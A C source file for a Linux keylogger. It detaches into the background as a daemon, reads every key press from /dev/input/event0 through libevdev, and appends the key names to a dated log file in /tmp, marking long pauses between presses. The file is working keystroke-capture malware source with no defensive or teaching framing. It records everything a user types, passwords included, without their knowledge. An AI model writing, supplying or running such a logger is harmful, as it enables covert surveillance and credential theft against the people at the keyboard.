#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <time.h>

#include <libevdev-1.0/libevdev/libevdev.h>


FILE *open_file_log() {
        char file_name[32];
        time_t time_now;
        struct tm *info_time;
        char buff_data[16];

        time(&time_now);
        info_time = localtime(&time_now);

        strftime(buff_data, sizeof(buff_data), "%Y-%m-%d", info_time);

        strcpy(file_name, "/tmp/log-");
        strcat(file_name, buff_data);
        strcat(file_name, ".txt");

        FILE *fptr = fopen(file_name, "a");
        if (fptr == NULL ) {
                perror("ERROR: file open");
                return NULL;
        }
        return fptr;
}


int run_keyboard_logger(void) {

    FILE *fptr = open_file_log();
    struct libevdev *dev = NULL;
    int fd;
    int rc = 1;

    fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        perror("Cannot open device");
        return 1;
    }

    rc = libevdev_new_from_fd(fd, &dev);
    if (rc < 0) {
        fprintf(stderr, "Failed to init libevdev (%s)\n", strerror(-rc));
        return 1;
    }

    printf("Input device name: \"%s\"\n", libevdev_get_name(dev));
    printf("Input device ID: bus %#x vendor %#x product %#x\n",
           libevdev_get_id_bustype(dev),
           libevdev_get_id_vendor(dev),
           libevdev_get_id_product(dev));

    printf("Reading mouse events...\n");

    time_t last_key_time = 0;
    time_t current_key_time;
    double time_diffrence;
    do {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);

        if (rc == 0) {
                if (ev.type == EV_KEY && ev.value == 1 ) {
                current_key_time = time(NULL);
                if (last_key_time > 0 ) {
                        time_diffrence = difftime(current_key_time, last_key_time);
                        if (time_diffrence > 10.0 ) {
                                fprintf(fptr, "----- %.0f sec from last hit key ------\n", time_diffrence);
                        }
                }
                const char *kkey = libevdev_event_code_get_name(ev.type, ev.code);
                const char *fkey = NULL;
                const char *check = strstr(kkey,"_");
                if (check != NULL) {
                        fkey = check + strlen("_");
                }
            printf("Event: %s %s %d\n",
                   libevdev_event_type_get_name(ev.type),
                   libevdev_event_code_get_name(ev.type, ev.code),
                   ev.value);
            if (strcmp(fkey,"SCAN") == 0 || strcmp(fkey,"REPORT") ==  0){
                continue;
           } else {
                last_key_time = current_key_time;

                if (strcmp(fkey,"SPACE") == 0 || strcmp(fkey,"ENTER") == 0) {
                        fprintf(fptr,"\n");
                } else {
                        fprintf(fptr, "%s", fkey);
                        fflush(fptr);
                }
           }
        }
        }
        if (rc == -EAGAIN) {
                usleep(10000);
        }

    } while (1);

    libevdev_free(dev);
    close(fd);
    fclose(fptr);

    return 0;
}

int main(void)
{
        pid_t pid;
        pid = daemon(0,0);
        if (pid == -1) {
                perror("ERROR: failed to daemonize");
                exit(1);
        }
        run_keyboard_logger();
}

